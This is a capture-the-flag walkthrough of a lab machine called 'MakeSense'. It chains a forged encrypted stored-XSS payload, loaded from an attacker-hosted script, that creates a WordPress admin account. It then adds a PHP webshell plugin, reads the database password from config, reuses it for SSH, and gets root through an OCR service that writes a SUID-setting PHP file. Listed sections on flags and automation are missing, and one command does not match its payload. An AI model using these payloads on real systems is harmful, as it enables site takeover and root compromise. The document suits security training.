```markdown
# HTB MakeSense - Full Writeup

**Machine:** MakeSense (HTB Medium Linux)  
**Date:** July 2026  
**Attacker IP:** `ATTACKER_IP`  
**Target IP:** `TARGET_IP`  

---

## Table of Contents

1. [Reconnaissance](#reconnaissance)
2. [WordPress Enumeration](#wordpress-enumeration)
3. [Discovering the Vulnerability](#discovering-the-vulnerability)
   - 3.1 Encrypted Voice Transcription
   - 3.2 Voice Message
4. [Initial Access – Stored XSS to Admin](#initial-access--stored-xss-to-admin)
   - 4.1 XSS Payload
   - 4.2 Encryption and Injection
   - 4.3 Trigger the XSS
5. [Gaining RCE – Malicious Plugin](#gaining-rce--malicious-plugin)
6. [Lateral Movement – SSH as `walter`](#lateral-movement--ssh-as-walter)
7. [Privilege Escalation – OCR Service Abuse](#privilege-escalation--ocr-service-abuse)
   - 7.1 Understanding the OCR Service
   - 7.2 The Exploit Idea
   - 7.3 Generating the Malicious Image
   - 7.4 Uploading and Triggering the OCR
   - 7.5 Getting the Root Shell
8. [Flags](#flags)
9. [Full Automation Script](#full-automation-script)
10. [Conclusion](#conclusion)

---

## Reconnaissance

An Nmap scan reveals:

```bash
nmap -sC -sV -p- -T4 -oN nmap_full.txt TARGET_IP
```

**Open Ports:**
- `22/tcp` – SSH (OpenSSH 9.6p1)
- `443/tcp` – HTTPS (Apache 2.4.58, WordPress)
- `80/tcp` – filtered (HTTP, but not directly accessible)
- `8001/tcp` – filtered (later identified as internal OCR service)

The HTTPS site uses a vhost: **`makesense.htb`** – we add it to `/etc/hosts`:

```bash
echo "TARGET_IP makesense.htb" >> /etc/hosts
```

---

## WordPress Enumeration

Run **WPScan** to enumerate users, plugins, and themes:

```bash
wpscan --url https://makesense.htb --disable-tls-checks --enumerate u,p,t
```

**Findings:**
- **WordPress version:** 7.0
- **Theme:** `webagency` (custom)
- **Users:** `admin`, `walter`, `jake`
- **Directory listing enabled:** `/wp-content/uploads/`
- **AI models directory:** `/wp-content/ai-models/transformers/`

---

## Discovering the Vulnerability

### 3.1 Encrypted Voice Transcription

The site features a voice transcription tool. The JavaScript file responsible is:

```
https://makesense.htb/wp-content/themes/webagency/assets/js/whisper/whisper-wrapper.js
```

Inside it, we find a **hardcoded AES‑GCM encryption key**:

```javascript
const ENCRYPTION_KEY = 'bLs6z8iv3gWpsvyeabFosDjb4YQe7jdU13rI';
```

This key is used to encrypt the payload before sending it to the server at:

```
/wp-admin/admin-ajax.php?action=save_voice_results
```

The server decrypts the data and stores the `transcription` field **without sanitization** → this leads to a **Stored XSS** vulnerability.

### 3.2 Voice Message

While enumerating the uploads directory, we find an audio file:

```
https://makesense.htb/wp-content/uploads/2026/01/<voice-message.wav>
```

Downloading and listening to it reveals:

> *"Hey this is Jake ... Clear. Light. Nice. Smooth. 4. 9. 2. 3."*

This gives us potential credentials:

- **User:** `jake`
- **Password:** `ClearLightNiceSmooth4923` (variations with spaces or without numbers are also possible).

---

## Initial Access – Stored XSS to Admin

### 4.1 XSS Payload

We craft a JavaScript payload that, when executed by an admin user, creates a new WordPress administrator account. The payload:

```javascript
(async () => {
  try {
    const r = await fetch('/wp-admin/user-new.php', {credentials:'include'});
    const h = await r.text();
    const m = h.match(/id="_wpnonce_create-user"[^>]*value="([a-f0-9]+)"/);
    if (!m) return;
    const b = new URLSearchParams();
    b.set('action','createuser');
    b.set('_wpnonce_create-user', m[1]);
    b.set('_wp_http_referer','/wp-admin/user-new.php');
    b.set('user_login','rootrunner');
    b.set('email','rootrunner@makesense.htb');
    b.set('pass1','P@ssw0rd@rootrunner');
    b.set('pass1-text','P@ssw0rd@rootrunner');
    b.set('pass2','P@ssw0rd@rootrunner');
    b.set('pw_weak','1');
    b.set('role','administrator');
    b.set('createuser','Add New User');
    await fetch('/wp-admin/user-new.php', {method:'POST', credentials:'include',
      headers:{'Content-Type':'application/x-www-form-urlencoded'}, body:b.toString()});
  } catch(e) {}
})();
```

### 4.2 Encryption and Injection

We need to encrypt the following JSON payload:

```json
{
  "transcription": "<script src='http://ATTACKER_IP:4445/x.js'></script>",
  "summary": "s"
}
```

**Steps:**

1. **Start a local HTTP server** to serve the XSS script (`x.js`).
2. **Obtain a nonce** from the theme by visiting the homepage and extracting `"nonce":"([a-f0-9]+)"`.
3. **Submit a dummy contact form** to get a `post_id`:
   ```http
   POST /wp-admin/admin-ajax.php
   action=submit_contact_form
   nonce=...
   name=a&email=a@a.com&phone=1&message=hello
   ```
4. **Encrypt the payload** using AES‑GCM:
   - Derive a 32‑byte key using SHA‑256 on the hardcoded string.
   - Use a random 12‑byte IV.
   - Encrypt the JSON string.
   - Prepend the IV and base64‑encode the result.
5. **Send the encrypted payload** to `save_voice_results`:
   ```http
   POST /wp-admin/admin-ajax.php
   action=save_voice_results
   nonce=...
   post_id=...
   encrypted_payload=<encrypted base64>
   ```

The payload is now stored in the database.

### 4.3 Trigger the XSS

The WordPress site has an automated admin bot that periodically visits the transcription page. When it does, the XSS executes and creates the `rootrunner` admin user with password `P@ssw0rd@rootrunner`.

We can verify by attempting to log in:

```bash
curl -k -X POST 'https://makesense.htb/wp-login.php' \
  -d "log=rootrunner&pwd=P@ssw0rd@rootrunner&wp-submit=Log In&redirect_to=https://makesense.htb/wp-admin/&testcookie=1" \
  -i
```

Look for the `wordpress_logged_in` cookie in the response.

---

## Gaining RCE – Malicious Plugin

Log in to WordPress as `rootrunner`.

Create a malicious plugin containing a webshell:

```bash
mkdir wshell
cat > wshell/wshell.php << 'EOF'
<?php
/**
 * Plugin Name: wshell
 */
if (isset($_REQUEST['c'])) {
    echo '<pre>';
    system($_REQUEST['c']);
    echo '</pre>';
}
?>
EOF
zip -r wshell.zip wshell/
```

Upload and activate it via **Plugins → Add New → Upload Plugin**.

Now we have Remote Code Execution:

```bash
curl -k 'https://makesense.htb/wp-content/plugins/wshell/wshell.php?c=id'
```

Output:
```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

---

## Lateral Movement – SSH as `walter`

Read `wp-config.php` to extract the database password:

```bash
curl -k 'https://makesense.htb/wp-content/plugins/wshell/wshell.php?c=cat%20../../../wp-config.php'
```

Look for:

```php
define( 'DB_PASSWORD', 'JbhHDAEgXvri3!' );
```

The password is reused for SSH user `walter`:

```bash
ssh walter@TARGET_IP
Password: JbhHDAEgXvri3!
```

We now have a low‑privilege shell.

---

## Privilege Escalation – OCR Service Abuse

### 7.1 Understanding the OCR Service

From the shell, we discover a service listening on `127.0.0.1:8001`:

```bash
curl http://127.0.0.1:8001/
```

It’s a web interface that lets users draw text, run Optical Character Recognition (Tesseract), and save the extracted text to a file in `/var/www/html/saved/`.  
The service runs as **root** (we can verify with `ps aux | grep ocr`).

### 7.2 The Exploit Idea

- We create an image that visually contains the PHP code:
  ```php
  <?php system('chmod +s /bin/bash'); ?>
  ```
- The OCR extracts this text and saves it as a `.php` file (e.g., `pwn.php`) in the web root.
- We then call that PHP file via the browser to execute the command, which sets the SUID bit on `/bin/bash`.
- Finally, we run `/bin/bash -p` to get a root shell.

### 7.3 Generating the Malicious Image

We need a clear, high‑contrast image that Tesseract can read reliably. Using Python’s Pillow library (on our Kali machine):

```python
from PIL import Image, ImageDraw, ImageFont

text = "<?php system('chmod +s /bin/bash'); ?>"
font = ImageFont.truetype('/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf', 64)
img = Image.new('RGB', (10,10), 'white')
d = ImageDraw.Draw(img)
bbox = d.textbbox((0,0), text, font=font)
W, H = bbox[2]-bbox[0]+80, bbox[3]-bbox[1]+80
img = Image.new('RGB', (W,H), 'white')
d = ImageDraw.Draw(img)
d.text((40-bbox[0], 40-bbox[1]), text, fill='black', font=font)
img.save('/tmp/payload.png')
```

We then convert the PNG to a **data URL** (base64‑encoded with the `data:image/png;base64,` prefix):

```python
import base64
with open('/tmp/payload.png', 'rb') as f:
    data_url = 'data:image/png;base64,' + base64.b64encode(f.read()).decode()
```

### 7.4 Uploading and Triggering the OCR

**Step 1:** Send the data URL to the OCR service:

```bash
response=$(curl -s -u "walter:JbhHDAEgXvri3!" --data-urlencode "canvas_image@/tmp/dataurl.txt" http://127.0.0.1:8001/)
```

**Step 2:** Extract the `ocr_id` from the response:

```bash
ocr_id=$(echo "$response" | grep -oP 'name="ocr_id" value="\K[^"]+')
```

**Step 3:** Save the recognized text as `pwn.php`:

```bash
curl -s -u "walter:JbhHDAEgXvri3!" -d "ocr_id=$ocr_id" -d "filename=pwn.php" -d "save_output=Save" http://127.0.0.1:8001/
```

The file is saved to `/var/www/html/saved/pwn.php` (or directly in `/var/www/html/`).

### 7.5 Getting the Root Shell

**Step 4:** Execute the PHP file to set SUID on `/bin/bash`:

```bash
curl -k 'https://makesense.htb/saved/pwn.php?cmd=chmod%2B s%2Fbin%2Fbash'
```

**Step 5:** Spawn a root shell:

```bash
/bin/bash -p
```

We are now **root**.

---

## Conclusion

MakeSense showcases how multiple seemingly minor weaknesses can be chained to compromise a system:

- **Exposed encryption key** → ability to forge authenticated‑looking requests.  
- **Stored XSS** via unsanitized transcription storage → admin account creation.  
- **Malicious plugin upload** → RCE as `www-data`.  
- **Password reuse** → SSH access as `walter`.  
- **Internal service running as root** with file‑write capability → privilege escalation.
